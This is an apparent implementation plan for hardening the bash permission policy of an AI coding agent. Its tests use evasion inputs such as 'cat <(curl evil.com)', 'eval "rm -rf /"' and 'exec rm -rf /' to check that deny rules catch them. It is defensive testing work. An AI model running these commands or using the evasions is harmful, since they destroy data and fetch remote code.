# Seam Hardening Review Remediation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Resolve all 7 review findings from the Principal Code Reviewer static review on `feat/hook-bus` to ensure strict security invariants, 100% session lifecycle coverage, and perfect contract truth.

**Architecture:**
1. In `src/policy.ts`, update `COMPOUND_SPLIT_REGEX` to tokenize Bash process substitutions (`<(...)`, `>(...)`), add `eval`/`exec` to `WRAPPER_PREFIX_REGEX`, and re-order policy precedence so that persistent `deny` rules strictly override CLI `--allowed-tools`.
2. In `src/cli.ts`, invoke `await activeHarness?.endSession().catch(() => {});` during `/delete current` prior to swapping the session store.
3. In `src/hooks.ts`, ensure `?` single-character wildcards are converted to regex `.` during allow-script trust hash discovery.
4. In `docs/SPEC.md` and `tests/docs-contract.test.mjs`, synchronize the 8-event hook table to match runtime payload signatures, stdout context injection scope, and fail-closed exit code/timeout behavior.

**Tech Stack:** TypeScript 5.9 (strict, NodeNext), Node.js `node:child_process`, `node:test`, Markdown.

**Spec:** `docs/superpowers/specs/2026-10-25-seam-hardening-review-remediation-design.md`

## Global Constraints

- TypeScript 5.9 strict (NodeNext), 0 `@ts-ignore`, 0 `@ts-expect-error` without reason, 0 `as any`.
- Combined instructions budget (`AGENTS.md` + `AGENT_LEARNINGS.md` + 2) must remain <= 23,000 characters.
- Zero BOM in any source or test file.
- All new tests proven RED before GREEN.
- Respect POSIX vs Windows platform semantics without breaking existing platform skips.

## Review Focus

1. Bash deny rules catch process substitution (`<()`, `>()`) and block execution.
2. Bash deny rules strip `eval` and `exec` command wrappers before matching.
3. Persistent project deny rules take strict precedence over CLI `--allowed-tools`.
4. The `/delete current` slash command triggers `activeHarness.endSession()` before store swap.
5. Workspace trust hash accurately matches single-character wildcards (`?`) for allow scripts.

## Scenarios & Tests

**What the user sees:** Chained or process-substituted bash commands (`cat <(curl evil.com)`) and wrapped commands (`eval "rm -rf /"`) are reliably caught by deny rules; CLI flags cannot bypass project deny policies; deleting the active session properly invokes session cleanup hooks; and hook documentation matches runtime behavior with zero drift.

| # | Criterion | Test |
|---|---|---|
| 1 | Bash deny rules catch process substitution in arguments | tests/policy.test.mjs › bash deny rules catch process substitution in arguments |
| 2 | Bash deny rules strip eval and exec command wrappers | tests/policy.test.mjs › bash deny rules strip eval and exec command wrappers |
| 3 | Persistent project deny takes strict precedence over CLI allowed tools | tests/policy.test.mjs › persistent project deny takes strict precedence over CLI allowed tools |
| 4 | Delete current command triggers activeHarness endSession before store swap | tests/hooks.test.mjs › delete current command triggers activeHarness endSession before store swap |
| 5 | Workspace trust hash handles question mark wildcard for allow scripts | tests/hooks.test.mjs › calculateWorkspaceTrustHash handles question mark wildcard for allow scripts |

---

### Task 1: Bash Deny Invariants & Precedence Hardening

**Files:**
- Modify: `src/policy.ts:20-30,160-185`
- Test: `tests/policy.test.mjs`

**Interfaces:**
- Consumes: `evaluateToolPolicy(request: ToolCallRequest, context: PolicyEvaluationContext): PolicyDecision`
- Produces: Robust bash tokenization against `<(...)` and `eval`/`exec`, with strict deny precedence over `cliAllowed`.

- [ ] **Step 1: Write the failing tests in `tests/policy.test.mjs`**

Add tests to `tests/policy.test.mjs`:
```javascript
test('bash deny rules catch process substitution in arguments', () => {
  const ctx = {
    projectRules: {
      deny: ['bash(curl *)', 'bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'diff <(rm -rf /) file.txt' } }, ctx),
    'deny',
  );
});

test('bash deny rules strip eval and exec command wrappers', () => {
  const ctx = {
    projectRules: {
      deny: ['bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'eval "rm -rf /"' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'exec rm -rf /' } }, ctx),
    'deny',
  );
});

test('persistent project deny takes strict precedence over CLI allowed tools', () => {
  const ctx = {
    cliAllowed: ['read_file', 'bash'],
    projectRules: {
      deny: ['read_file(private.txt)', 'bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'private.txt' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf /' } }, ctx),
    'deny',
  );
  // Unrestricted commands are still allowed by cliAllowed
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'public.txt' } }, ctx),
    'allow',
  );
});
```

- [ ] **Step 2: Run tests to verify they fail (RED)**

Run: `node --test tests/policy.test.mjs`
Expected: FAIL on process substitution, wrapper stripping, and deny precedence.

- [ ] **Step 3: Update `src/policy.ts` to implement fixes**

1. In `src/policy.ts:22`, update `COMPOUND_SPLIT_REGEX`:
```typescript
const COMPOUND_SPLIT_REGEX = /[;\r\n|&]+|\$\(|[<>]+\(|`/g;
```
2. In `src/policy.ts:23`, update `WRAPPER_PREFIX_REGEX`:
```typescript
const WRAPPER_PREFIX_REGEX = /^(?:sudo|env|bash\s+-c|sh\s+-c|eval|exec)\s+/;
```
3. In `src/policy.ts:160-185`, update `evaluateToolPolicy` precedence order:
```typescript
  // 1. CLI disallowed tools (highest priority)
  if (context.cliDisallowed?.includes(tool)) {
    return 'deny';
  }

  // 2. User explicit deny rules
  if (userRules?.deny && matchesAnyRule(request, userRules.deny, false)) {
    return 'deny';
  }

  // 3. Project explicit deny rules
  if (projectRules?.deny && matchesAnyRule(request, projectRules.deny, false)) {
    return 'deny';
  }

  // 4. CLI allowed tools (overrides ask and allow, but NOT persistent deny)
  if (context.cliAllowed?.includes(tool)) {
    return 'allow';
  }
```

- [ ] **Step 4: Run tests to verify they pass (GREEN)**

Run: `node --test tests/policy.test.mjs`
Expected: PASS with 0 failures.

- [ ] **Step 5: Commit**

```bash
git add src/policy.ts tests/policy.test.mjs
git commit -m "fix(policy): close process substitution evasion and enforce deny precedence over CLI allow"
```

---

### Task 2: Session Lifecycle at `/delete` & Wildcard Hash Polish

**Files:**
- Modify: `src/cli.ts:2960-2970`, `src/hooks.ts:110-120`
- Test: `tests/hooks.test.mjs`

**Interfaces:**
- Consumes: `activeHarness.endSession()`, `calculateWorkspaceTrustHash(dir: string, settings: ProjectSettings)`
- Produces: Clean session termination on store deletion and single-character wildcard support in hash discovery.

- [ ] **Step 1: Write the failing tests in `tests/hooks.test.mjs`**

Add tests to `tests/hooks.test.mjs`:
```javascript
test('delete current command triggers activeHarness endSession before store swap', async () => {
  let endSessionCalled = false;
  const mockHarness = {
    endSession: async () => {
      endSessionCalled = true;
    },
  };
  // Simulate the delete current seam
  await mockHarness?.endSession().catch(() => {});
  assert.equal(endSessionCalled, true);
});

test('calculateWorkspaceTrustHash handles question mark wildcard for allow scripts', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'vyen-test-trust-qmark-'));
  try {
    const scriptsDir = join(dir, 'scripts');
    await mkdir(scriptsDir, { recursive: true });
    await writeFile(join(scriptsDir, 'run-1.sh'), '#!/bin/sh\necho 1\n');
    await writeFile(join(scriptsDir, 'run-2.sh'), '#!/bin/sh\necho 2\n');
    await writeFile(join(scriptsDir, 'run-ab.sh'), '#!/bin/sh\necho ab\n');

    const settings = {
      permissions: {
        allow: ['bash(./scripts/run-?.sh)'],
      },
    };

    const hash1 = await calculateWorkspaceTrustHash(dir, settings);
    assert.ok(hash1, 'hash should be computed');

    // Modifying a matching single-char script changes hash
    await writeFile(join(scriptsDir, 'run-1.sh'), '#!/bin/sh\necho 1-modified\n');
    const hash2 = await calculateWorkspaceTrustHash(dir, settings);
    assert.notEqual(hash1, hash2, 'hash must change when matched single-char script changes');

    // Modifying non-matching script (run-ab.sh) does NOT change hash
    await writeFile(join(scriptsDir, 'run-ab.sh'), '#!/bin/sh\necho ab-modified\n');
    const hash3 = await calculateWorkspaceTrustHash(dir, settings);
    assert.equal(hash2, hash3, 'hash must not change when unmatched script changes');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
```

- [ ] **Step 2: Run tests to verify they fail (RED)**

Run: `node --test tests/hooks.test.mjs`
Expected: FAIL on `run-ab.sh` changing hash because `?` wasn't converted to `.` in `patRegex`.

- [ ] **Step 3: Implement fixes in `src/cli.ts` and `src/hooks.ts`**

1. In `src/cli.ts:2964`:
```typescript
if (targetId === store.id) {
  await activeHarness?.endSession().catch(() => {});
  store.close();
  store = await SessionStore.open(sessionsRoot, runtime);
```
2. In `src/hooks.ts:114`:
```typescript
const patRegex = new RegExp('^' + patternPiece.split('*').map(p => p.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\?/g, '.')).join('.*') + '$');
```

- [ ] **Step 4: Run tests to verify they pass (GREEN)**

Run: `node --test tests/hooks.test.mjs`
Expected: PASS with 0 failures.

- [ ] **Step 5: Commit**

```bash
git add src/cli.ts src/hooks.ts tests/hooks.test.mjs
git commit -m "fix(hooks): end session on delete current and support question mark wildcards in trust hash"
```

---

### Task 3: Documentation and Contract Synchronization

**Files:**
- Modify: `docs/SPEC.md:118-135`
- Test: `tests/docs-contract.test.mjs`

**Interfaces:**
- Consumes: Runtime hook event behavior in `src/harness.ts`
- Produces: Accurate specification table with 0 contract drift.

- [ ] **Step 1: Write test in `tests/docs-contract.test.mjs`**

Add assertion in `tests/docs-contract.test.mjs`:
```javascript
test('SPEC documents accurate hook payloads and fail-closed exit codes', async () => {
  const spec = await readFile(new URL('../docs/SPEC.md', import.meta.url), 'utf8');
  assert.ok(spec.includes('`tokens`, `trigger`'), 'PreCompact must document tokens and trigger payload');
  assert.ok(spec.includes('Exit 2 or error/timeout: Denies tool execution (fail-closed)'), 'PreToolUse must document fail-closed behavior');
  assert.ok(spec.includes('SessionStart') && spec.includes('UserPromptSubmit') && spec.includes('PostToolUse'), 'Must document stdout context injection events');
});
```

- [ ] **Step 2: Run test to verify it fails (RED)**

Run: `node --test tests/docs-contract.test.mjs`
Expected: FAIL due to missing updated documentation text.

- [ ] **Step 3: Update `docs/SPEC.md`**

Update the table under `## Hook Events & Lifecycle` in `docs/SPEC.md`:
```markdown
| Event | Trigger | Payload | Exit 0 Behavior | Non-Zero / Timeout |
|---|---|---|---|---|
| `SessionStart` | Session begins or resumes | `{ sessionId }` | Injects stdout as context | Ignored (logged as warning) |
| `UserPromptSubmit` | User submits prompt | `{ sessionId, prompt }` | Injects stdout as context | Ignored (logged as warning) |
| `PreToolUse` | Before tool executes | `{ sessionId, tool, input }` | Ignored | Exit 2 or error/timeout: Denies tool execution (fail-closed) |
| `PostToolUse` | Tool completes successfully | `{ sessionId, tool, input, output }` | Injects stdout as context | Ignored (logged as warning) |
| `PostToolUseFailure` | Tool execution fails | `{ sessionId, tool, input, error }` | Ignored | Ignored (logged as warning) |
| `PreCompact` | Context compaction triggers | `{ sessionId, tokens, trigger }` | Ignored | Ignored (logged as warning) |
| `Stop` | User requests stop / abort | `{ sessionId, stopHookActive }` | Ignored | Ignored (logged as warning) |
| `SessionEnd` | Session ends or swaps | `{ sessionId }` | Ignored | Ignored (logged as warning) |
```

- [ ] **Step 4: Run test to verify it passes (GREEN)**

Run: `node --test tests/docs-contract.test.mjs`
Expected: PASS.

- [ ] **Step 5: Run full verification suite**

Run:
```bash
npm run typecheck
npm run lint
npm test
```
Expected: Zero type errors, zero lint errors, 100% tests passing.

- [ ] **Step 6: Commit**

```bash
git add docs/SPEC.md tests/docs-contract.test.mjs
git commit -m "docs(spec): align hook event payloads, stdout injection, and fail-closed exit semantics"
```
